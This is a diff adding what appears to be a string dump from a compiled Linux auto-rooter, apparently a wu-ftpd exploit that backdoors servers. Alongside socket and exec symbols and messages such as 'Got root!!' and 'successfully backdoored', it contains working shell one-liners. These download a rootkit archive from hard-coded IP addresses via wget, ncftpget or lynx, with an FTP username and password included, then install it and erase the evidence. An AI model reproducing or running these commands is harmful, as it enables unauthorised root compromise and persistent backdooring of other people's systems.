@@ -1,0 +1,64 @@
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+printf
+stdout
+connect
+__strtol_internal
+execl
+perror
+dup2
+sleep
+gethostbyaddr
+socket
+fflush
+alarm
+pipe
+write
+fprintf
+inet_addr
+__deregister_frame_info
+strstr
+signal
+read
+strncpy
+fork
+gethostbyname
+fclose
+exit
+fopen
+_IO_putc
+_IO_stdin_used
+__libc_start_main
+__register_frame_info
+close
+GLIBC_2.1
+GLIBC_2.0
+PTRh
+tUhx
+JRh`
+timed out, bah fuck it!!
+failed to connect to root - possible firewall :( 
+awu.list
+*** %s (%s) has been successfully backdoored.
+%s %s
+tar -zxf rk.tgz ; sleep 10 ; cd work ; ./install doomed 18725 ; sleep 40 ; cd .. ; rm -rf rk.tgz ; rm -Rf work; echo "1"
+tar -zxf rk.tgz ; sleep 10 ; cd work ; ./install doomed 18725 ; sleep 40 ; cd .. ; rm -rf rk.tgz;rm -Rf work ; echo "1"
+echo 1 ; if [ -f /usr/bin/wget ] ; then /usr/bin/wget http://136.176.52.62/rk.tgz ; else if [ -f /usr/bin/ncftpget ] ; then /usr/bin/ncftpget ftp://maaiman:gokvcvz3@128.210.138.107/rk.tgz ; else if [ -f /usr/bin/lynx ] ; then /usr/bin/lynx -dump http://136.176.52.62/rk.tgz >> rk.tgz ; fi ; fi ; fi
+Usage: %s <type> <ip>
+./wu
+[Target: %s (%s)  Timeout: %ds, %ds, %ds]
+read()
+uid=0
+Got root!!...
+...downloading rootkit...
+# 1. filling memory gaps
+ phase 2...
+# spawning shell
+ phase 3...
+blah
+..sleeping 100s while rootkit installs..
+..checking rootkit
+exit
+FUCK :( got a stupid ERROR on this box. Couldn't backdoor.
+OSF       
